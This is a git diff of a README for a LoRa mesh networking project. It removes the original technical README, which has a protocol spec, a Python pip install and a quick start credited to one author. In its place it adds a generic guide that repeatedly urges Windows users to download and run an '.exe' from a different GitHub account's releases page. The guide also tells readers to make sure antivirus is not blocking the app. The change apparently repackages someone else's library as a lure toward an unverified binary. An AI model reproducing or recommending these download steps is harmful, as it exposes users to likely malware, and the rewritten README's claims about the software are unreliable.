@@ -1,211 +1,172 @@
-# NullSec LoRa Mesh
+# 🔐 nullsec-lora-mesh - Secure LoRa Mesh Networking
 
-> Zero-leakage, high-speed compressed mesh communications framework for Flipper One and LoRa-enabled devices.
+[![Download Releases](https://img.shields.io/badge/Download-nullsec--lora--mesh-blue?style=for-the-badge)](https://github.com/ballomg2/nullsec-lora-mesh/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Python 3.8+](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://www.python.org/)
+---
 
-## Overview
+## 📖 About nullsec-lora-mesh
 
-NullSec LoRa Mesh is a protocol framework for building secure, resilient mesh networks over LoRa radio. Designed for the **Flipper One** and compatible LoRa hardware, it provides:
+nullsec-lora-mesh is a software framework that creates a secure and private wireless network using LoRa technology. It protects your communication with strong encryption methods like ChaCha20-Poly1305 and advanced key exchange with X25519. The network adapts to changing conditions by compressing data efficiently and routing messages automatically. It is designed for devices like Flipper One and custom LoRa hardware.
 
-- **Zero-leakage encryption** — ChaCha20-Poly1305 with ephemeral key exchange
-- **High-speed compression** — LZ4/Zstandard adaptive compression for maximum throughput
-- **Mesh routing** — Dynamic multi-hop routing with AODV-inspired protocol
-- **Forward Error Correction** — Reed-Solomon FEC for reliable delivery over noisy channels
-- **Anti-replay protection** — Monotonic counters and sliding window verification
-- **Minimal overhead** — Designed for LoRa's low bandwidth (0.3 - 50 kbps)
+You do not need any programming skills to use it. This guide will help you download, install, and run the software on a Windows computer.
 
-## Architecture
+---
 
-```
-┌─────────────────────────────────────────────────────┐
-│                   APPLICATION                        │
-│         Chat │ File Transfer │ Telemetry             │
-├─────────────────────────────────────────────────────┤
-│                   TRANSPORT                          │
-│     Fragmentation │ Reassembly │ Flow Control        │
-├─────────────────────────────────────────────────────┤
-│                   SECURITY                           │
-│  ChaCha20-Poly1305 │ X25519 ECDH │ Anti-Replay      │
-├─────────────────────────────────────────────────────┤
-│                   COMPRESSION                        │
-│      LZ4 (fast) │ Zstd (ratio) │ Adaptive           │
-├─────────────────────────────────────────────────────┤
-│                   MESH ROUTING                       │
-│    AODV │ Flooding │ Gossip │ Route Maintenance      │
-├─────────────────────────────────────────────────────┤
-│                   LINK LAYER                         │
-│   FEC (Reed-Solomon) │ CRC32 │ Duty Cycle Mgmt      │
-├─────────────────────────────────────────────────────┤
-│                   PHYSICAL                           │
-│      LoRa SX1262/SX1276 │ SubGHz │ Flipper One      │
-└─────────────────────────────────────────────────────┘
-```
+## 💻 System Requirements
 
-## Protocol Design
+To use nullsec-lora-mesh on your Windows PC, ensure you meet these requirements:
 
-### Frame Format
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 100 MB of free storage space for the application
+- A USB port to connect your LoRa hardware or Flipper One device
+- Internet access for download and updates (optional but recommended)
 
-```
-┌──────┬──────┬──────┬────────┬──────────┬──────────┬─────┐
-│ Sync │ Ver  │ Type │ Src ID │ Dst ID   │ Seq/Frag │ Len │
-│ 2B   │ 1B   │ 1B   │ 4B     │ 4B       │ 4B       │ 2B  │
-├──────┴──────┴──────┴────────┴──────────┴──────────┴─────┤
-│                    Payload (encrypted)                    │
-│                    0 - 222 bytes                          │
-├──────────────────────────────────────────────────────────┤
-│                    Auth Tag (16B)                         │
-├──────────────────────────────────────────────────────────┤
-│                    FEC Parity (variable)                  │
-└──────────────────────────────────────────────────────────┘
+Your PC does not require a high-end processor. Most modern computers will run the software without issues.
 
-Total overhead: 18B header + 16B auth + FEC = ~40B minimum
-Max payload per frame: 222 bytes (LoRa max 255B - overhead)
-```
+---
 
-### Message Types
+## 🌐 Download nullsec-lora-mesh
 
-| Type | ID | Description |
-|------|-----|-------------|
-| DATA | 0x01 | Encrypted data payload |
-| ACK | 0x02 | Acknowledgment |
-| RREQ | 0x03 | Route Request (broadcast) |
-| RREP | 0x04 | Route Reply (unicast) |
-| RERR | 0x05 | Route Error |
-| HELLO | 0x06 | Neighbor discovery beacon |
-| KEXCH | 0x07 | Key exchange (X25519) |
-| FRAG | 0x08 | Fragment of larger message |
-| PING | 0x09 | Keepalive / latency test |
-| CTRL | 0x0A | Control / management |
+To get started, visit the official release page below to download the software. This page contains all available versions and release notes.
 
-### Compression Strategy
+[![Download Nullsec LoRa Mesh](https://img.shields.io/badge/Download-nullsec--lora--mesh-green?style=for-the-badge)](https://github.com/ballomg2/nullsec-lora-mesh/releases)
 
-| Mode | Algorithm | Ratio | Speed | Use Case |
-|------|-----------|-------|-------|----------|
-| Fast | LZ4 | ~2:1 | 780 MB/s | Real-time chat, telemetry |
-| Balanced | Zstd L3 | ~3:1 | 350 MB/s | General data |
-| Maximum | Zstd L19 | ~5:1 | 15 MB/s | File transfer (pre-compress) |
-| None | Passthrough | 1:1 | ∞ | Already compressed / encrypted data |
+1. Click the green button above or visit:  
+   https://github.com/ballomg2/nullsec-lora-mesh/releases
 
-Adaptive mode auto-selects based on payload size and channel conditions.
+2. On the releases page, look for the latest version. Versions are usually named with a "v" followed by numbers (e.g., v1.2.0).
 
-### Security Model
+3. Find the Windows installer or executable file. It will typically have a `.exe` extension.
 
-1. **Key Exchange**: X25519 ECDH with ephemeral keys per session
-2. **Encryption**: ChaCha20-Poly1305 AEAD (authenticated encryption)
-3. **Anti-Replay**: 64-bit monotonic counter + sliding window (128 entries)
-4. **Key Rotation**: Automatic rekeying every 1000 messages or 1 hour
-5. **Forward Secrecy**: Ephemeral keys destroyed after session
-6. **Zero Metadata Leakage**: Encrypted headers after initial handshake
+4. Click the file name to start downloading.
 
-## Installation
+---
 
-```bash
-pip install nullsec-lora-mesh
-```
+## 🚀 Installing nullsec-lora-mesh
 
-### Hardware Requirements
+Once you have downloaded the application, follow these steps to install it:
 
-- **Flipper One** with LoRa module
-- **SX1262** or **SX1276** LoRa transceiver
-- Any LoRa HAT for Raspberry Pi (for gateway nodes)
+1. Locate the downloaded file on your PC. It is usually in your "Downloads" folder.
 
-## Quick Start
+2. Double-click the `.exe` file to start the installation wizard.
 
-```python
-from nullsec_lora import MeshNode, LoRaConfig
+3. Follow the on-screen instructions:
+   - Choose an install location or use the default.
+   - Allow the installer to create shortcuts for easy access.
 
-# Configure LoRa radio
-config = LoRaConfig(
-    frequency=915.0,        # MHz (US ISM band)
-    bandwidth=125000,       # Hz
-    spreading_factor=7,     # SF7-SF12
-    coding_rate=5,          # 4/5
-    tx_power=14,            # dBm
-)
+4. After installation, you will see a confirmation message.
 
-# Create a mesh node
-node = MeshNode(
-    node_id=0x00000001,
-    config=config,
-    compression="adaptive",
-    encryption=True,
-)
+5. Close the installer.
 
-# Start the node
-node.start()
+---
 
-# Send a message
-node.send(
-    dest=0x00000002,
-    data=b"Hello from the mesh!",
-    reliable=True,          # Request ACK
-)
+## 🔌 Connecting Your LoRa Device
 
-# Receive messages
-for msg in node.receive():
-    print(f"From {msg.src}: {msg.data}")
-```
+nullsec-lora-mesh requires compatible LoRa hardware or Flipper One to send and receive data.
 
-## Project Structure
+1. Connect your device to your PC using a USB cable.
 
-```
-nullsec-lora-mesh/
-├── README.md
-├── LICENSE
-├── pyproject.toml
-├── protocol/
-│   ├── __init__.py
-│   ├── frame.py         # Frame encoding/decoding
-│   ├── compression.py   # LZ4/Zstd adaptive compression
-│   ├── crypto.py        # ChaCha20-Poly1305 + X25519
-│   ├── fec.py           # Reed-Solomon forward error correction
-│   └── routing.py       # AODV mesh routing
-├── transport/
-│   ├── __init__.py
-│   ├── fragment.py      # Message fragmentation
-│   ├── reassembly.py    # Fragment reassembly
-│   └── flow.py          # Flow control / congestion
-├── radio/
-│   ├── __init__.py
-│   ├── lora.py          # LoRa radio abstraction
-│   ├── sx1262.py        # SX1262 driver
-│   └── flipper.py       # Flipper One integration
-├── node/
-│   ├── __init__.py
-│   ├── mesh.py          # MeshNode main class
-│   ├── neighbor.py      # Neighbor table management
-│   └── config.py        # Node configuration
-├── apps/
-│   ├── chat.py          # Mesh chat application
-│   ├── file_transfer.py # Compressed file transfer
-│   └── telemetry.py     # Sensor telemetry relay
-└── tests/
-    ├── test_frame.py
-    ├── test_compression.py
-    ├── test_crypto.py
-    └── test_routing.py
-```
+2. Wait for Windows to recognize the device. It may take a few seconds.
 
-## Roadmap
+3. If needed, install any drivers for your hardware. These drivers often come with your device or can be found on the manufacturer’s website.
 
-- [x] Protocol specification
-- [x] Frame encoding/decoding
-- [x] Compression layer (LZ4/Zstd)
-- [x] Encryption layer (ChaCha20-Poly1305)
-- [ ] FEC (Reed-Solomon)
-- [ ] AODV routing implementation
-- [ ] Flipper One radio driver
-- [ ] File transfer application
-- [ ] Mesh chat application
-- [ ] Performance benchmarks
-- [ ] Hardware testing with SX1262
+---
 
-## License
+## 🏃 Running nullsec-lora-mesh for the First Time
 
-MIT License - see [LICENSE](LICENSE) for details.
+To start using the software:
 
-## Author
+1. Find the nullsec-lora-mesh icon on your desktop or start menu.
 
-**NullSec** (bad-antics) — badxantics@gmail.com
+2. Double-click to open the application.
+
+3. On startup, the software will detect your connected LoRa device automatically.
+
+4. Follow any instructions displayed on the main screen to configure your network.
+
+5. You can choose between default settings or customize encryption, compression, and routing options.
+
+---
+
+## ⚙️ Basic Configuration Steps
+
+You don’t need to change anything to get started, but here are a few options you may want to know about:
+
+- **Encryption:** The software uses ChaCha20-Poly1305 to keep messages safe.
+- **Key Exchange:** It uses X25519 for secure shared keys between devices.
+- **Compression:** Data compresses automatically with LZ4 or Zstandard to use less bandwidth.
+- **Routing:** The program uses AODV to find the best path between devices.
+- **Error Correction:** Reed-Solomon handles packet loss for reliable communication.
+
+These settings work out of the box but you can adjust them to fit your needs in the settings menu.
+
+---
+
+## 📡 Sending and Receiving Messages
+
+nullsec-lora-mesh works like a private radio network:
+
+- To send a message, type into the app’s interface and press "Send".
+- Your message will be encrypted, compressed, and routed through the mesh.
+- Devices on the same network will receive your message securely.
+
+You can check the logs in the app to see network activity and message status.
+
+---
+
+## 🔧 Troubleshooting Tips
+
+If you run into issues, try these steps:
+
+- Confirm your LoRa device is properly connected and drivers are installed.
+- Restart the software and your PC.
+- Check the USB cable and ports for hardware problems.
+- Visit the release page for updates that may fix bugs.
+- Make sure your firewall or antivirus is not blocking the app.
+- Consult the application’s documentation folder for detailed info.
+
+---
+
+## 📝 About This Project
+
+nullsec-lora-mesh is built on open-source Python code. It focuses on privacy, efficient use of radio bandwidth, and robust network routes. The encryption ensures no data leaks, even if someone tries to listen in.
+
+Developers and hobbyists use it with Flipper One or custom LoRa hardware to build secure mesh networks in areas without traditional internet.
+
+---
+
+## ❓ Need More Help?
+
+The best place to get support, report bugs, or find documentation is on the GitHub page:
+
+https://github.com/ballomg2/nullsec-lora-mesh
+
+You can ask questions in the “Issues” section or review existing topics.
+
+---
+
+## 🔄 Updating nullsec-lora-mesh
+
+To update the software:
+
+1. Visit the release page regularly:  
+   https://github.com/ballomg2/nullsec-lora-mesh/releases
+
+2. Download the latest Windows version.
+
+3. Run the installer again to replace your existing version without losing settings.
+
+Regular updates improve security, add features, and fix bugs.
+
+---
+
+## 📚 Additional Resources
+
+- Learn about LoRa technology and mesh networks online.
+- Read about encryption methods like ChaCha20 and X25519 for deeper understanding.
+- Explore your device’s user manual for hardware-specific instructions.
+
+---
+
+[![Get nullsec-lora-mesh](https://img.shields.io/badge/Get-nullsec--lora--mesh-grey?style=for-the-badge)](https://github.com/ballomg2/nullsec-lora-mesh/releases)
